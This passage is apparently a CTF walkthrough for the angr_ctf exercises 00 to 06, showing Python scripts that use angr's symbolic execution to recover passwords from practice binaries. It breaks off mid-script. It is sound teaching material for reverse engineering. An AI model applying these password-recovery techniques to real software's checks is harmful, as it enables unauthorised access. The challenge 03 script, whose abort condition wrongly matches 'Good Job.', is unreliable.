        <content type="html"><![CDATA[<p>angr_ctf: <a href="https://github.com/jakespringer/angr_ctf">https://github.com/jakespringer/angr_ctf</a><br>angr: <a href="https://angr.io/">https://angr.io/</a></p><h2 id="00-angr-find"><a href="#00-angr-find" class="headerlink" title="00_angr_find"></a>00_angr_find</h2><p>Step</p><pre><code>1. Create an angr project. 2. Create an entry to start execution. 3. Create a simulation manager initialized with the starting state. 4. Explore the binary. 5. Find the input.</code></pre><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  <span class="comment"># Create an Angr project.</span></span><br><span class="line">  <span class="comment"># If you want to be able to point to the binary from the command line, you can</span></span><br><span class="line">  <span class="comment"># use argv[1] as the parameter. Then, you can run the script from the command</span></span><br><span class="line">  <span class="comment"># line as follows:</span></span><br><span class="line">  <span class="comment"># python ./scaffold00.py [binary]</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]  <span class="comment"># m:string</span></span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Tell Angr where to start executing (should it start from the main()</span></span><br><span class="line">  <span class="comment"># function or somewhere else?) For now, use the entry_state function</span></span><br><span class="line">  <span class="comment"># to instruct Angr to start from the main() function.</span></span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create a simulation manager initialized with the starting state. It provides</span></span><br><span class="line">  <span class="comment"># a number of useful tools to search and execute the binary.</span></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Explore the binary to attempt to find the address that prints &quot;Good Job.&quot;</span></span><br><span class="line">  <span class="comment"># You will have to find the address you want to find and insert it here. </span></span><br><span class="line">  <span class="comment"># This function will keep executing until it either finds a solution or it </span></span><br><span class="line">  <span class="comment"># has explored every possible path through the executable.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  print_good_address = ???  # :integer (probably in hexadecimal)</span><br><span class="line">  simulation.explore(find=print_good_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Check that we have found a solution. The simulation.explore() method will</span></span><br><span class="line">  <span class="comment"># set simulation.found to a list of the states that it could find that reach</span></span><br><span class="line">  <span class="comment"># the instruction we asked it to search for. Remember, in Python, if a list</span></span><br><span class="line">  <span class="comment"># is empty, it will be evaluated as false, otherwise true.</span></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    <span class="comment"># The explore method stops after it finds a single state that arrives at the</span></span><br><span class="line">    <span class="comment"># target address.</span></span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Print the string that Angr wrote to stdin to follow solution_state. This </span></span><br><span class="line">    <span class="comment"># is our solution.</span></span><br><span class="line">    <span class="built_in">print</span> solution_state.posix.dumps(sys.stdin.fileno())</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># If Angr could not find a path that reaches print_good_address, throw an</span></span><br><span class="line">    <span class="comment"># error. Perhaps you mistyped the print_good_address?</span></span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>The problem solving script:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line"></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  target_addr = <span class="number">0x08048678</span></span><br><span class="line">  simulation.explore(find=target_addr)</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Cound&#x27;t find it!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="01-angr-avoid"><a href="#01-angr-avoid" class="headerlink" title="01_angr_avoid"></a>01_angr_avoid</h2><blockquote><p>Tick stash “stash” forward (up to “n” times or until “num_find” states are found), looking for condition “find”, avoiding condition “avoid”. Stores found states into “find_stash’ and avoided states into “avoid_stash”.</p><p>The “find” and “avoid” parameters may be any of:</p><ul><li>An address to find</li><li>A set or list of addresses to find</li><li>A function that takes a state and returns whether or not it matches.</li></ul><p>If an angr CFG is passed in as the “cfg” parameter and “find” is either a number or a list or a set, then any states which cannot possibly reach a success state without going through a failure state will be preemptively avoided.</p></blockquote><p>The “avoid” argument will not store the found state. This will help us save the time.</p><p>When I fixed the problem, IDA suggested that the function was too large.</p><p>When I solved this challenge and used ida to decompile, IDA showed that the function was too big.</p><p>Solution: change the config file.</p><p>MacOS: IDA_HOME/idabin/cfg/hexrays.cfg</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MAX_FUNCSIZE            = <span class="number">64</span>        <span class="comment">// Functions over 64K are not decompiled</span></span><br></pre></td></tr></table></figure><p>Change that to the following:</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">MAX_FUNCSIZE            = <span class="number">1024</span>        <span class="comment">// Functions over 1024K are not decompiled</span></span><br></pre></td></tr></table></figure><p>Although we fixed the configuration file, this function is too big and we will spend too much time decompiling it. So we can read the assembly code directly. </p><p><img src="https://i.loli.net/2021/09/10/eMunHzcQvViNpyt.png" alt="01-1.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  <span class="comment"># Explore the binary, but this time, instead of only looking for a state that</span></span><br><span class="line">  <span class="comment"># reaches the print_good_address, also find a state that does not reach </span></span><br><span class="line">  <span class="comment"># will_not_succeed_address. The binary is pretty large, to save you some time,</span></span><br><span class="line">  <span class="comment"># everything you will need to look at is near the beginning of the address </span></span><br><span class="line">  <span class="comment"># space.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  binary_path = argv[<span class="number">1</span>]</span><br><span class="line">  proj = angr.Project(binary_path, auto_load_libs=<span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">  initial_state = proj.factory.entry_state()</span><br><span class="line">  simulation = proj.factory.simulation_manager(initial_state)</span><br><span class="line"></span><br><span class="line">  target_address = <span class="number">0x80485E0</span></span><br><span class="line">  avoid_address = [<span class="number">0x080485A8</span>, <span class="number">0x080485F2</span>]</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=target_address, avoid=avoid_address)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Don&#x27;t find the target.&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="02-angr-find-condition"><a href="#02-angr-find-condition" class="headerlink" title="02_angr_find_condition"></a>02_angr_find_condition</h2><blockquote><p>It is very useful to be able to search <em>for</em> a state that reaches a certain</p><p>instruction. However, <em>in</em> some cases, you may not know the address of the</p><p>specific instruction you want to reach (<em>or</em> perhaps there <em>is</em> no single</p><p>instruction goal.) In this challenge, you don’t know which instruction</p><p>grants you success. Instead, you just know that you want to find a state where</p><p>the binary prints “Good Job.”</p><p>Angr is powerful in that it allows you to search <em>for</em> a states that meets an</p><p>arbitrary condition that you specify <em>in</em> Python, using a predicate you define</p><p><em>as</em> a function that takes a state and returns True <em>if</em> you have found what you</p><p>are looking <em>for</em>, and False otherwise.</p></blockquote><p>Although we can find the address of the target instruction, in order to train the writing of angr, we use the recommended method of the script, which is to find the conditions we hope to achieve by writing functions.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  bin_path = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(bin_path)</span><br><span class="line">  </span><br><span class="line">  initial_state = project.factory.entry_state()</span><br><span class="line">  simulation = project.factory.simulation_manager(initial_state)</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Try again.&quot;</span> <span class="keyword">in</span> state.posix.dumps(sys.stdout.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    print(simulation.found[<span class="number">0</span>].posix.dumps(sys.stdin.fileno()).decode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&quot;Can&#x27;t find it.&quot;</span>)</span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><h2 id="03-angr-symbolic-registers"><a href="#03-angr-symbolic-registers" class="headerlink" title="03_angr_symbolic_registers"></a>03_angr_symbolic_registers</h2><p>Through this challenge we can learn how to control registers and manually set entries through angr.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Angr doesn&#x27;t currently support reading multiple things with scanf (Ex: </span></span><br><span class="line"><span class="comment"># scanf(&quot;%u %u).) You will have to tell the simulation engine to begin the</span></span><br><span class="line"><span class="comment"># program after scanf is called and manually inject the symbols into registers.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Sometimes, you want to specify where the program should start. The variable</span></span><br><span class="line">  <span class="comment"># start_address will specify where the symbolic execution engine should begin.</span></span><br><span class="line">  <span class="comment"># Note that we are using blank_state, not entry_state.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  start_address = <span class="number">0x8048980</span>  <span class="comment"># :integer (probably hexadecimal)</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Create a symbolic bitvector (the datatype Angr uses to inject symbolic</span></span><br><span class="line">  <span class="comment"># values into the binary.) The first parameter is just a name Angr uses</span></span><br><span class="line">  <span class="comment"># to reference it. </span></span><br><span class="line">  <span class="comment"># You will have to construct multiple bitvectors. Copy the two lines below</span></span><br><span class="line">  <span class="comment"># and change the variable names. To figure out how many (and of what size)</span></span><br><span class="line">  <span class="comment"># you need, dissassemble the binary and determine the format parameter passed</span></span><br><span class="line">  <span class="comment"># to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password_size_in_bits = <span class="number">20</span> * <span class="number">8</span>  <span class="comment"># :integer</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, password_size_in_bits)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, password_size_in_bits)</span><br><span class="line">  password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, password_size_in_bits)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Set a register to a symbolic value. This is one way to inject symbols into</span></span><br><span class="line">  <span class="comment"># the program.</span></span><br><span class="line">  <span class="comment"># initial_state.regs stores a number of convenient attributes that reference</span></span><br><span class="line">  <span class="comment"># registers by name. For example, to set eax to password0, use:</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># initial_state.regs.eax = password0</span></span><br><span class="line">  <span class="comment">#</span></span><br><span class="line">  <span class="comment"># You will have to set multiple registers to distinct bitvectors. Copy and</span></span><br><span class="line">  <span class="comment"># paste the line below and change the register. To determine which registers</span></span><br><span class="line">  <span class="comment"># to inject which symbol, dissassemble the binary and look at the instructions</span></span><br><span class="line">  <span class="comment"># immediately following the call to scanf.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.regs.eax = password0</span><br><span class="line">  initial_state.regs.ebx = password1</span><br><span class="line">  initial_state.regs.edx = password2</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span> <span class="keyword">if</span> <span class="string">&quot;Good Job.&quot;</span> <span class="keyword">in</span> stdout_output.decode(<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Solve for the symbolic values. If there are multiple solutions, we only</span></span><br><span class="line">    <span class="comment"># care about one, so we can use eval, which returns any (but only one)</span></span><br><span class="line">    <span class="comment"># solution. Pass eval the bitvector you want to solve for.</span></span><br><span class="line">    <span class="comment"># (!)</span></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2)</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Aggregate and format the solutions you computed above, and then print</span></span><br><span class="line">    <span class="comment"># the full string. Pay attention to the order of the integers, and the</span></span><br><span class="line">    <span class="comment"># expected base (decimal, octal, hexadecimal, etc).</span></span><br><span class="line">    <span class="comment"># solution = solution0 + &quot; &quot; + solution1 + &quot; &quot; + solution2  # :string</span></span><br><span class="line">    print(<span class="string">&quot;&#123;:x&#125; &#123;:x&#125; &#123;:x&#125;&quot;</span>.<span class="built_in">format</span>(solution0, solution1, solution2))</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br></pre></td></tr></table></figure><p>Keywords: simulation.found[0].solver.eval(), initial_state.regs.register</p><h2 id="04-angr-symbolic-stack"><a href="#04-angr-symbolic-stack" class="headerlink" title="04_angr_symbolic_stack"></a>04_angr_symbolic_stack</h2><p>This challenge exercises our ability to construct stacks using angr.</p><p>Tips:</p><blockquote><p> Since we are starting after scanf, we are skipping this stack construction step. To make up for this, we need to construct the stack ourselves. Let us start by initializing ebp in the exact same way the program does.</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This challenge will be more challenging than the previous challenges that you</span></span><br><span class="line"><span class="comment"># have encountered thus far. Since the goal of this CTF is to teach symbolic</span></span><br><span class="line"><span class="comment"># execution and not how to construct stack frames, these comments will work you</span></span><br><span class="line"><span class="comment"># through understanding what is on the stack.</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"><span class="comment"># IMPORTANT: Any addresses in this script aren&#x27;t necessarily right! Dissassemble</span></span><br><span class="line"><span class="comment">#            the binary yourself to determine the correct addresses!</span></span><br><span class="line"><span class="comment">#   ! ! !</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048697</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  initial_state.regs.ebp = initial_state.regs.esp</span><br><span class="line">  print(initial_state.regs.ebp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  </span><br><span class="line">  padding_length_in_bytes = <span class="number">8</span>   <span class="comment"># :integer</span></span><br><span class="line">  initial_state.regs.esp -= padding_length_in_bytes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  initial_state.stack_push(password0)  <span class="comment"># :bitvector (claripy.BVS, claripy.BVV, claripy.BV)</span></span><br><span class="line">  initial_state.stack_push(password1)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Good&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&quot;Try&quot;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1)</span><br><span class="line">    ...</span><br><span class="line">    print(solution0, solution1)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>padding_length_in_bytes = 8</code></p><p>Note that the value of padding in the above script is calculated by stack.</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.text:08048679                 push    ebp</span><br><span class="line">.text:0804867A                 mov     ebp, esp</span><br><span class="line">.text:0804867C                 sub     esp, 18h</span><br></pre></td></tr></table></figure><p>In ida, the stack memory for this function is 0x18 bytes.</p><p>“v1” is located at the position of “ebp - 0x10” and the “v2” is located at the position of “ebp - 0xc”.  So when the address is indexed by ESP, the offset is 0x18-0x10, which is exactly the position of the first parameter.</p><p>keywords: initial_state.stack_push()</p><h2 id="05-angr-symbolic-memory"><a href="#05-angr-symbolic-memory" class="headerlink" title="05_angr_symbolic_memory"></a>05_angr_symbolic_memory</h2><blockquote><p>  Determine the address of the global variable to which scanf writes the user input. The function ‘initial_state.memory.store(address, value)’ will write ‘value’ (a bitvector) to ‘address’ (a memory location, <em>as</em> an integer.) The ‘address’ parameter can also be a bitvector (<em>and</em> can be symbolic!).</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048601</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># The binary is calling scanf(&quot;%8s %8s %8s %8s&quot;).</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password2 = claripy.BVS(<span class="string">&#x27;password2&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  password3 = claripy.BVS(<span class="string">&#x27;password3&#x27;</span>, <span class="number">160</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  password0_address = <span class="number">0xA1BA1C0</span></span><br><span class="line">  password1_address = <span class="number">0xA1BA1C8</span></span><br><span class="line">  password2_address = <span class="number">0xA1BA1D0</span></span><br><span class="line">  password3_address = <span class="number">0xA1BA1D8</span></span><br><span class="line"></span><br><span class="line">  initial_state.memory.store(password0_address, password0)</span><br><span class="line">  initial_state.memory.store(password1_address, password1)</span><br><span class="line">  initial_state.memory.store(password2_address, password2)</span><br><span class="line">  initial_state.memory.store(password3_address, password3)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, avoid=should_abort)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> simulation.found:</span><br><span class="line">    solution_state = simulation.found[<span class="number">0</span>]</span><br><span class="line">    solution0 = solution_state.solver.<span class="built_in">eval</span>(password0, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution1 = solution_state.solver.<span class="built_in">eval</span>(password1, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution2 = solution_state.solver.<span class="built_in">eval</span>(password2, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    solution3 = solution_state.solver.<span class="built_in">eval</span>(password3, cast_to=<span class="built_in">bytes</span>).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">    ...</span><br><span class="line">    print(solution0, solution1, solution2, solution3)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">raise</span> Exception(<span class="string">&#x27;Could not find the solution&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main(sys.argv)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Keyword: initial_state.memory.store(address, value)</p><h2 id="06-angr-symbolic-dynamic-memory"><a href="#06-angr-symbolic-dynamic-memory" class="headerlink" title="06_angr_symbolic_dynamic_memory"></a>06_angr_symbolic_dynamic_memory</h2><blockquote><p>  Instead of telling the binary to write to the address of the memory  allocated with malloc, we can simply fake an address to any unused block of memory and overwrite the pointer to the data. This will point the pointer with the address of pointer_to_malloc_memory_address0 to fake_heap_address.<br>  Be aware, there is more than one pointer! Analyze the binary to determine global location of each pointer.<br>  Note: by default, Angr stores integers in memory with big-endianness. To specify to use the endianness of your architecture, use the parameter endness=project.arch.memory_endness. On x86, this is little-endian.</p></blockquote><p>The key to this challenge is that we skipped malloc at the address at the beginning, so we have to manually allocate a fake heap address for it.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>(<span class="params">argv</span>):</span></span><br><span class="line">  path_to_binary = argv[<span class="number">1</span>]</span><br><span class="line">  project = angr.Project(path_to_binary)</span><br><span class="line"></span><br><span class="line">  start_address = <span class="number">0x08048699</span></span><br><span class="line">  initial_state = project.factory.blank_state(addr=start_address)</span><br><span class="line"></span><br><span class="line">  password0 = claripy.BVS(<span class="string">&#x27;password0&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">  password1 = claripy.BVS(<span class="string">&#x27;password1&#x27;</span>, <span class="number">64</span>)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  fake_heap_address0 = <span class="number">0xABCC800</span></span><br><span class="line">  pointer_to_malloc_memory_address0 = <span class="number">0xABCC8A4</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address0, fake_heap_address0, endness=project.arch.memory_endness)</span><br><span class="line"></span><br><span class="line">  fake_heap_address1 = <span class="number">0xABCC7e0</span></span><br><span class="line">  pointer_to_malloc_memory_address1 = <span class="number">0xABCC8AC</span></span><br><span class="line">  initial_state.memory.store(pointer_to_malloc_memory_address1, fake_heap_address1, endness=project.arch.memory_endness)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Store our symbolic values at our fake_heap_address. Look at the binary to</span></span><br><span class="line">  <span class="comment"># determine the offsets from the fake_heap_address where scanf writes.</span></span><br><span class="line">  <span class="comment"># (!)</span></span><br><span class="line">  initial_state.memory.store(fake_heap_address0, password0)</span><br><span class="line">  initial_state.memory.store(fake_heap_address1, password1)</span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line">  simulation = project.factory.simgr(initial_state)</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">is_successful</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Good&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">should_abort</span>(<span class="params">state</span>):</span></span><br><span class="line">    stdout_output = state.posix.dumps(sys.stdout.fileno())</span><br><span class="line">    <span class="keyword">return</span> <span class="string">b&#x27;Try&#x27;</span> <span class="keyword">in</span> stdout_output</span><br><span class="line"></span><br><span class="line">  simulation.explore(find=is_successful, 